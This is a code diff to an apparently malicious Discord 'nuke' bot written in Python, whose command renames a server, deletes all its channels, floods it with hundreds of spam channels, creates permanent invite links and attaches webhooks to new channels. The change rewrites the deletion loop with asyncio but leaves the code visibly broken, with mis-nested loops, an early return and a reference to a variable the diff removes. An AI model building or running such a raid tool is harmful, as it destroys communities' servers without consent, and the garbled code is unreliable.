@@ -3,6 +3,7 @@ from discord.ext import commands
 import random
 import requests as rq
 import colorama
+import asyncio
 from colorama import Fore, Back, Style, init
 init()
 
@@ -39,21 +40,21 @@ async def on_ready():
 async def nuke(ctx):
     await ctx.send("You wanna see what the massacre is? ill let u see it")
     await ctx.guild.edit(name=SERVNICK)
-    guild = ctx.guild
-    for channel in list(ctx.guild.channels):
-      try:
-        await channel.delete()
-      except:
-        print("DELETING CHANNELS: FAILED")
-    for _i in range(125):
+    tasks = []
+    
+    for channel in ctx.guild.channels:
+      tasks.append(asyncio.create_task(channel.delete()))
+      await asyncio.gather(*tasks)
+      for _i in range(125):
         await ctx.guild.create_text_channel(name=(random.choice(CHANNELS)))
-    for channel in guild.text_channels:
-        link = await channel.create_invite(max_age = 0, max_uses = 0)
-        print(f"New Invite Link: {link}")
-    amount = 500
-    for i in range(amount):
-        await ctx.guild.create_text_channel(name=random.choice(CHANNELS))
-    return
+        for channel in guild.text_channels:
+          link = await channel.create_invite(max_age = 0, max_uses = 0)
+          print(f"New Invite Link: {link}")
+          amount = 500
+          for i in range(amount):
+            await ctx.guild.create_text_channel(name=random.choice(CHANNELS))
+            return
+
 @client.event
 async def on_guild_channel_create(channel):
     webhook = await channel.create_webhook(name=random.choice(WEBHOOKS))
